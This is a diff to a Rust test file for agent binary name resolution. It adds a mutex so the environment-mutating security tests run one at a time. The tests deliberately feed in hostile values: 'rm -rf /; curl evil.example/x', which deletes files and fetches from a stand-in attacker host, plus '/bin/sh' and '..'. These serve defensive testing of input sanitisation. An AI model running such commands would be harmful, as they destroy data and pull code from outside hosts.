@@ -7,9 +7,15 @@
 
 use std::fs;
 use std::os::unix::fs::symlink;
+use std::sync::{Mutex, OnceLock};
 use tempfile::TempDir;
 
 use amplihack_utils::agent_binary::{ALLOWED_BINARIES, resolve, validate_binary_name};
+
+fn env_lock() -> &'static Mutex<()> {
+    static LOCK: OnceLock<Mutex<()>> = OnceLock::new();
+    LOCK.get_or_init(|| Mutex::new(()))
+}
 
 fn clear_env() {
     // SAFETY: tests serialized; env mutation unsafe in edition 2024.
@@ -35,6 +41,7 @@ fn try_set_env(value: &str) -> bool {
 
 #[test]
 fn s1_allowlist_is_case_insensitive_exact_match() {
+    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
     for good in &[
         "claude",
         "Claude",
@@ -55,6 +62,7 @@ fn s1_allowlist_is_case_insensitive_exact_match() {
 
 #[test]
 fn s2_env_input_sanitization_rejects_dangerous_chars() {
+    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
     let bad = [
         "/bin/sh",
         "..",
@@ -80,6 +88,7 @@ fn s2_env_input_sanitization_rejects_dangerous_chars() {
 
 #[test]
 fn s2_env_input_length_capped() {
+    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
     clear_env();
     let tmp = TempDir::new().unwrap();
     set_env(&"a".repeat(33));
@@ -89,6 +98,7 @@ fn s2_env_input_length_capped() {
 
 #[test]
 fn s3_json_typed_struct_rejects_unexpected_shape() {
+    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
     clear_env();
     let tmp = TempDir::new().unwrap();
     let runtime = tmp.path().join(".claude").join("runtime");
@@ -104,6 +114,7 @@ fn s3_json_typed_struct_rejects_unexpected_shape() {
 
 #[test]
 fn s3_json_64kib_size_cap() {
+    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
     clear_env();
     let tmp = TempDir::new().unwrap();
     let runtime = tmp.path().join(".claude").join("runtime");
@@ -119,6 +130,7 @@ fn s3_json_64kib_size_cap() {
 
 #[test]
 fn s5_walk_up_capped_at_32_ancestors() {
+    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
     clear_env();
     let tmp = TempDir::new().unwrap();
     // No launcher_context anywhere.
@@ -133,6 +145,7 @@ fn s5_walk_up_capped_at_32_ancestors() {
 
 #[test]
 fn s5_symlink_escape_is_blocked() {
+    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
     clear_env();
     let outer = TempDir::new().unwrap();
     let attacker = TempDir::new().unwrap();
@@ -157,6 +170,7 @@ fn s5_symlink_escape_is_blocked() {
 
 #[test]
 fn s7_error_messages_do_not_leak_env_value() {
+    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
     clear_env();
     let tmp = TempDir::new().unwrap();
     set_env("rm -rf /; curl evil.example/x");
@@ -172,6 +186,7 @@ fn s7_error_messages_do_not_leak_env_value() {
 
 #[test]
 fn s8_resolved_value_always_in_allowlist() {
+    let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
     clear_env();
     let tmp = TempDir::new().unwrap();
     let resolved = resolve(tmp.path()).unwrap();
